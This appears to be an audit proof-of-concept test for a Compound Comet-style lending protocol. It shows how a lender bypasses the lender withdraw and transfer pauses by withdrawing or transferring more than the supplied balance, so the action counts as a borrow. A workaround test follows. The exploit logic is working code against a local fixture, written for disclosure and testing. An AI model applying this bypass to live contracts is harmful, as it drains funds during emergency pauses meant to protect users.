import { expect, exp, makeProtocol, takeSnapshot, SnapshotRestorer } from './helpers';
import { FaucetToken, CometHarnessInterfaceExtendedAssetList } from '../build/types';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';

/**
 * PoC for F-1: the lender pause can be bypassed by crossing into a borrow.
 *
 * withdrawBase/transferBase classify the action by the sign of src's balance AFTER the action.
 * A lender with supply S and borrowing power who withdraws (or transfers) S + x ends with a
 * negative balance, so only the borrowers flag is checked and the whole S leaves the market
 * while pauseLendersWithdraw / pauseLendersTransfer is on.
 */
describe('PoC F-1: lender pause bypass by crossing into a borrow', function () {
  const SUPPLY = exp(1_000, 6);        // alice's base supply
  const EXTRA_BORROW = exp(10, 6);     // > baseBorrowMin (1 USDC)
  const COLLATERAL = exp(10, 18);      // 10 COMP @ $100, borrowCF 0.8 => $800 borrowing power
  const LIQUIDITY = exp(10_000, 6);    // bob's supply, so the market has cash

  let comet: CometHarnessInterfaceExtendedAssetList;
  let usdc: FaucetToken;
  let comp: FaucetToken;
  let pauseGuardian: SignerWithAddress;
  let alice: SignerWithAddress;
  let bob: SignerWithAddress;
  let dave: SignerWithAddress;

  let fixture: SnapshotRestorer;

  before(async () => {
    const protocol = await makeProtocol({
      base: 'USDC',
      assets: {
        USDC: { decimals: 6, initialPrice: 1 },
        COMP: { decimals: 18, initialPrice: 100, borrowCF: exp(0.8, 18), liquidateCF: exp(0.85, 18), liquidationFactor: exp(0.9, 18) },
      },
    });
    comet = protocol.cometWithExtendedAssetList;
    usdc = protocol.tokens['USDC'] as FaucetToken;
    comp = protocol.tokens['COMP'] as FaucetToken;
    pauseGuardian = protocol.pauseGuardian;
    [alice, bob, dave] = protocol.users;

    await usdc.allocateTo(bob.address, LIQUIDITY);
    await usdc.connect(bob).approve(comet.address, LIQUIDITY);
    await comet.connect(bob).supply(usdc.address, LIQUIDITY);

    await usdc.allocateTo(alice.address, SUPPLY);
    await usdc.connect(alice).approve(comet.address, SUPPLY);
    await comet.connect(alice).supply(usdc.address, SUPPLY);

    await comp.allocateTo(alice.address, COLLATERAL);
    await comp.connect(alice).approve(comet.address, COLLATERAL);
    await comet.connect(alice).supply(comp.address, COLLATERAL);

    fixture = await takeSnapshot();
  });

  after(async () => {
    await fixture.restore();
  });

  describe('withdraw while pauseLendersWithdraw is on', () => {
    let snapshot: SnapshotRestorer;

    before(async () => {
      snapshot = await takeSnapshot();
      await comet.connect(pauseGuardian).pauseLendersWithdraw(true);
    });

    after(async () => {
      await snapshot.restore();
    });

    it('precondition: lenders paused, borrowers not paused, alice is a pure lender', async () => {
      expect(await comet.isLendersWithdrawPaused()).to.be.true;
      expect(await comet.isBorrowersWithdrawPaused()).to.be.false;
      expect(await comet.balanceOf(alice.address)).to.equal(SUPPLY);
      expect(await comet.borrowBalanceOf(alice.address)).to.equal(0);
    });

    it('control: a plain lender withdraw of the full supply is blocked', async () => {
      await expect(
        comet.connect(alice).withdraw(usdc.address, SUPPLY)
      ).to.be.revertedWithCustomError(comet, 'LendersWithdrawPaused');
    });

    describe('bypass: withdraw(SUPPLY + EXTRA_BORROW)', () => {
      let walletBefore: bigint;
      let totalSupplyBefore: bigint;

      before(async () => {
        walletBefore = (await usdc.balanceOf(alice.address)).toBigInt();
        totalSupplyBefore = (await comet.totalSupply()).toBigInt();

        await comet.connect(alice).withdraw(usdc.address, SUPPLY + EXTRA_BORROW);
      });

      it('lender pause is still on', async () => {
        expect(await comet.isLendersWithdrawPaused()).to.be.true;
      });

      it('alice received her whole supply plus the borrow', async () => {
        const walletAfter = (await usdc.balanceOf(alice.address)).toBigInt();
        expect(walletAfter - walletBefore).to.equal(SUPPLY + EXTRA_BORROW);
      });

      it('alice has no supply left and owes only EXTRA_BORROW', async () => {
        expect(await comet.balanceOf(alice.address)).to.equal(0);
        expect(await comet.borrowBalanceOf(alice.address)).to.equal(EXTRA_BORROW);
      });

      it('total supply dropped by the whole lender position', async () => {
        const totalSupplyAfter = (await comet.totalSupply()).toBigInt();
        expect(totalSupplyBefore - totalSupplyAfter).to.equal(SUPPLY);
      });
    });
  });

  describe('transfer while pauseLendersTransfer is on', () => {
    let snapshot: SnapshotRestorer;

    before(async () => {
      snapshot = await takeSnapshot();
      await comet.connect(pauseGuardian).pauseLendersTransfer(true);
    });

    after(async () => {
      await snapshot.restore();
    });

    it('control: a plain lender transfer of the full supply is blocked', async () => {
      await expect(
        comet.connect(alice).transfer(dave.address, SUPPLY)
      ).to.be.revertedWithCustomError(comet, 'LendersTransferPaused');
    });

    describe('bypass: transfer(dave, SUPPLY + EXTRA_BORROW)', () => {
      before(async () => {
        await comet.connect(alice).transfer(dave.address, SUPPLY + EXTRA_BORROW);
      });

      it('lender transfer pause is still on', async () => {
        expect(await comet.isLendersTransferPaused()).to.be.true;
      });

      it('dave received the whole lender position plus the borrow', async () => {
        expect(await comet.balanceOf(dave.address)).to.equal(SUPPLY + EXTRA_BORROW);
      });

      it('alice has no supply left and owes only EXTRA_BORROW', async () => {
        expect(await comet.balanceOf(alice.address)).to.equal(0);
        expect(await comet.borrowBalanceOf(alice.address)).to.equal(EXTRA_BORROW);
      });
    });
  });

  describe('workaround: pausing borrowers as well closes the bypass', () => {
    let snapshot: SnapshotRestorer;

    before(async () => {
      snapshot = await takeSnapshot();
      await comet.connect(pauseGuardian).pauseLendersWithdraw(true);
      await comet.connect(pauseGuardian).pauseBorrowersWithdraw(true);
    });

    after(async () => {
      await snapshot.restore();
    });

    it('crossing withdraw reverts with BorrowersWithdrawPaused', async () => {
      await expect(
        comet.connect(alice).withdraw(usdc.address, SUPPLY + EXTRA_BORROW)
      ).to.be.revertedWithCustomError(comet, 'BorrowersWithdrawPaused');
    });
  });
});
